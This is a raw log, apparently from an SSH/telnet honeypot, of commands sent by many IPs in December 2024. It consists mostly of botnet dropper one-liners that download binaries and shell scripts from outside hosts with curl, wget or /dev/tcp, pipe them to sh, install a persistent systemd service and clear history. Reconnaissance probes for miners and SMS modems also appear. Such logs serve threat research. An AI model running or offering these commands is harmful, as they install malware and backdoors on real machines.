start
2024-12-10 19:45:22.971151 - ('45.148.10.203', 54192) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 19:45:27.278235 - ('45.148.10.203', 54194) - apt
2024-12-10 19:45:27.718313 - ('45.148.10.203', 54194) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 19:45:32.760324 - ('45.148.10.203', 59364) - apt
2024-12-10 19:45:32.942857 - ('45.148.10.203', 59364) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 19:45:37.323162 - ('45.148.10.203', 59390) - apt
2024-12-10 19:45:37.516655 - ('45.148.10.203', 59390) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 19:45:41.878401 - ('45.148.10.203', 41694) - apt
2024-12-10 19:45:42.059737 - ('45.148.10.203', 41694) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 19:45:46.422757 - ('45.148.10.203', 41706) - apt
2024-12-10 19:45:46.598453 - ('45.148.10.203', 41706) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 19:45:51.021267 - ('45.148.10.203', 60204) - apt
2024-12-10 19:45:51.203166 - ('45.148.10.203', 60204) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 19:45:55.730843 - ('45.148.10.203', 60212) - apt
2024-12-10 19:45:55.911423 - ('45.148.10.203', 60212) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 19:46:00.275894 - ('45.148.10.203', 53016) - apt
2024-12-10 19:46:00.466215 - ('45.148.10.203', 53016) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 19:46:04.786676 - ('45.148.10.203', 53034) - apt
2024-12-10 19:46:04.963357 - ('45.148.10.203', 53034) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 19:46:09.509850 - ('45.148.10.203', 33166) - apt
2024-12-10 19:46:09.686879 - ('45.148.10.203', 33166) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 19:46:14.036718 - ('45.148.10.203', 33170) - apt
2024-12-10 19:46:14.215946 - ('45.148.10.203', 33170) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 19:46:18.604579 - ('45.148.10.203', 49044) - apt
2024-12-10 19:46:18.798550 - ('45.148.10.203', 49044) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 20:44:45.117339 - ('210.108.85.147', 53360) - /ip cloud print
2024-12-10 20:44:46.575347 - ('210.108.85.147', 53360) - ifconfig
2024-12-10 20:44:47.755445 - ('210.108.85.147', 53360) - uname -a
2024-12-10 20:44:48.935403 - ('210.108.85.147', 53360) - cat /proc/cpuinfo
2024-12-10 20:44:50.123389 - ('210.108.85.147', 53360) - ps | grep '[Mm]iner'
2024-12-10 20:44:51.307559 - ('210.108.85.147', 53360) - ps -ef | grep '[Mm]iner'
2024-12-10 20:44:52.491014 - ('210.108.85.147', 53360) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-10 20:44:53.675057 - ('210.108.85.147', 53360) - echo Hi | cat -n
2024-12-10 20:47:20.570225 - ('195.178.110.6', 41788) - apt
2024-12-10 20:47:20.970563 - ('195.178.110.6', 41788) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 20:47:29.613661 - ('195.178.110.6', 41796) - apt
2024-12-10 20:47:30.672172 - ('195.178.110.6', 41796) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 20:47:41.278454 - ('195.178.110.6', 38532) - apt
2024-12-10 20:47:41.797777 - ('195.178.110.6', 38532) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 20:47:49.378732 - ('195.178.110.6', 34288) - apt
2024-12-10 20:47:50.971290 - ('195.178.110.6', 34288) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 22:16:39.764095 - ('58.75.226.162', 54519) - /ip cloud print
2024-12-10 22:16:41.263320 - ('58.75.226.162', 54519) - ifconfig
2024-12-10 22:16:42.487508 - ('58.75.226.162', 54519) - uname -a
2024-12-10 22:16:43.715447 - ('58.75.226.162', 54519) - cat /proc/cpuinfo
2024-12-10 22:16:44.935367 - ('58.75.226.162', 54519) - ps | grep '[Mm]iner'
2024-12-10 22:16:46.155377 - ('58.75.226.162', 54519) - ps -ef | grep '[Mm]iner'
2024-12-10 22:16:47.375459 - ('58.75.226.162', 54519) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-10 22:16:48.595412 - ('58.75.226.162', 54519) - echo Hi | cat -n
2024-12-10 22:22:15.459486 - ('115.141.107.196', 46663) - /ip cloud print
2024-12-10 22:22:17.083288 - ('115.141.107.196', 46663) - ifconfig
2024-12-10 22:22:18.443152 - ('115.141.107.196', 46663) - uname -a
2024-12-10 22:22:19.794998 - ('115.141.107.196', 46663) - cat /proc/cpuinfo
2024-12-10 22:22:21.135091 - ('115.141.107.196', 46663) - ps | grep '[Mm]iner'
2024-12-10 22:22:22.475061 - ('115.141.107.196', 46663) - ps -ef | grep '[Mm]iner'
2024-12-10 22:22:23.815145 - ('115.141.107.196', 46663) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-10 22:22:25.159037 - ('115.141.107.196', 46663) - echo Hi | cat -n
2024-12-10 22:51:56.607658 - ('122.33.57.121', 36083) - /ip cloud print
2024-12-10 22:51:58.251242 - ('122.33.57.121', 36083) - ifconfig
2024-12-10 22:51:59.600990 - ('122.33.57.121', 36083) - uname -a
2024-12-10 22:52:00.944887 - ('122.33.57.121', 36083) - cat /proc/cpuinfo
2024-12-10 22:52:02.296423 - ('122.33.57.121', 36083) - ps | grep '[Mm]iner'
2024-12-10 22:52:03.646251 - ('122.33.57.121', 36083) - ps -ef | grep '[Mm]iner'
2024-12-10 22:52:04.996970 - ('122.33.57.121', 36083) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-10 22:52:06.344999 - ('122.33.57.121', 36083) - echo Hi | cat -n
2024-12-10 23:25:56.140482 - ('59.187.75.4', 49408) - /ip cloud print
2024-12-10 23:25:57.608832 - ('59.187.75.4', 49408) - ifconfig
2024-12-10 23:25:58.804716 - ('59.187.75.4', 49408) - uname -a
2024-12-10 23:26:00.008503 - ('59.187.75.4', 49408) - cat /proc/cpuinfo
2024-12-10 23:26:01.204512 - ('59.187.75.4', 49408) - ps | grep '[Mm]iner'
2024-12-10 23:26:02.404363 - ('59.187.75.4', 49408) - ps -ef | grep '[Mm]iner'
2024-12-10 23:26:03.604462 - ('59.187.75.4', 49408) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-10 23:26:04.804283 - ('59.187.75.4', 49408) - echo Hi | cat -n
2024-12-11 02:36:49.801579 - ('45.148.10.203', 35792) - apt
2024-12-11 02:36:50.036891 - ('45.148.10.203', 35792) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 02:36:54.497843 - ('45.148.10.203', 35814) - apt
2024-12-11 02:36:54.677528 - ('45.148.10.203', 35814) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 02:36:58.989195 - ('45.148.10.203', 46652) - apt
2024-12-11 02:36:59.169613 - ('45.148.10.203', 46652) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 02:37:03.476775 - ('45.148.10.203', 46656) - apt
2024-12-11 02:37:03.657454 - ('45.148.10.203', 46656) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 02:37:08.040772 - ('45.148.10.203', 40758) - apt
2024-12-11 02:37:08.217185 - ('45.148.10.203', 40758) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 02:37:12.523726 - ('45.148.10.203', 40782) - apt
2024-12-11 02:37:12.705047 - ('45.148.10.203', 40782) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 02:46:25.467875 - ('45.148.10.46', 57304) - apt
2024-12-11 02:46:25.663465 - ('45.148.10.46', 57304) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 02:46:38.805131 - ('45.148.10.46', 43322) - apt
2024-12-11 02:46:40.106967 - ('45.148.10.46', 43322) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 02:46:48.716017 - ('45.148.10.46', 33222) - apt
2024-12-11 02:46:51.807125 - ('45.148.10.46', 33222) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 03:03:39.555348 - ('122.33.141.210', 34598) - /ip cloud print
2024-12-11 03:03:41.150187 - ('122.33.141.210', 34598) - ifconfig
2024-12-11 03:03:42.453166 - ('122.33.141.210', 34598) - uname -a
2024-12-11 03:03:43.756901 - ('122.33.141.210', 34598) - cat /proc/cpuinfo
2024-12-11 03:03:45.065795 - ('122.33.141.210', 34598) - ps | grep '[Mm]iner'
2024-12-11 03:03:46.368868 - ('122.33.141.210', 34598) - ps -ef | grep '[Mm]iner'
2024-12-11 03:03:47.677988 - ('122.33.141.210', 34598) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-11 03:03:49.001013 - ('122.33.141.210', 34598) - echo Hi | cat -n
2024-12-11 04:12:01.637270 - ('154.213.187.182', 51784) - cd /tmp; rm -rf mpsl; curl -o mpsl http://62.60.244.220/mpsl; chmod +x mpsl; ./mpsl bob.mpsl.curl
2024-12-11 04:49:29.885962 - ('87.120.113.231', 42714) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-12-11 06:12:15.099743 - ('85.218.33.240', 60286) - wget -qO - http://61.215.136.198/x/1sh | sh > /dev/null 2>&1 &
2024-12-11 06:12:15.171164 - ('85.218.33.240', 60286) - rm -rf /var/run/1sh; wget -c http://61.215.136.198/x/1sh -P /var/run && sh /var/run/1sh &
2024-12-11 06:12:15.240954 - ('85.218.33.240', 60286) - wget -qO - http://61.215.136.198/x/2sh | sh > /dev/null 2>&1 &
2024-12-11 06:12:15.311778 - ('85.218.33.240', 60286) - rm -rf /tmp/2sh; wget -c http://61.215.136.198/x/2sh -P /tmp && sh /tmp/2sh &
2024-12-11 06:12:15.382155 - ('85.218.33.240', 60286) - curl http://61.215.136.198/x/3sh | sh
2024-12-11 06:12:15.460457 - ('85.218.33.240', 60286) - cd /var/run ; rm -rf tsh ; tftp -g 127.0.0.1 -r tsh ; sh tsh &
2024-12-11 06:12:15.530602 - ('85.218.33.240', 60286) - cd /tmp ; rm -rf tsh ; tftp -g 127.0.0.1 -r tsh ; sh tsh &
2024-12-11 06:12:15.602905 - ('85.218.33.240', 60286) - cd /dev/shm ; rm -rf tsh ; tftp -g 127.0.0.1 -r tsh ; sh tsh &
2024-12-11 06:12:15.670624 - ('85.218.33.240', 60286) - uname -a || cat /proc/version || echo -- 
2024-12-11 06:44:55.892222 - ('49.160.90.8', 52525) - /ip cloud print
2024-12-11 06:44:57.546576 - ('49.160.90.8', 52525) - ifconfig
2024-12-11 06:44:58.906132 - ('49.160.90.8', 52525) - uname -a
2024-12-11 06:45:00.258052 - ('49.160.90.8', 52525) - cat /proc/cpuinfo
2024-12-11 06:45:01.621996 - ('49.160.90.8', 52525) - ps | grep '[Mm]iner'
2024-12-11 06:45:02.981821 - ('49.160.90.8', 52525) - ps -ef | grep '[Mm]iner'
2024-12-11 06:45:04.337869 - ('49.160.90.8', 52525) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-11 06:45:05.689683 - ('49.160.90.8', 52525) - echo Hi | cat -n
2024-12-11 06:56:11.507107 - ('87.120.113.231', 48028) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-12-11 08:12:41.321934 - ('122.32.248.132', 49113) - /ip cloud print
2024-12-11 08:12:42.966976 - ('122.32.248.132', 49113) - ifconfig
2024-12-11 08:12:44.309177 - ('122.32.248.132', 49113) - uname -a
2024-12-11 08:12:45.653092 - ('122.32.248.132', 49113) - cat /proc/cpuinfo
2024-12-11 08:12:47.001072 - ('122.32.248.132', 49113) - ps | grep '[Mm]iner'
2024-12-11 08:12:48.348950 - ('122.32.248.132', 49113) - ps -ef | grep '[Mm]iner'
2024-12-11 08:12:49.692949 - ('122.32.248.132', 49113) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-11 08:12:51.036936 - ('122.32.248.132', 49113) - echo Hi | cat -n
2024-12-11 09:20:04.711587 - ('115.141.125.74', 48545) - /ip cloud print
2024-12-11 09:20:06.347934 - ('115.141.125.74', 48545) - ifconfig
2024-12-11 09:20:07.686032 - ('115.141.125.74', 48545) - uname -a
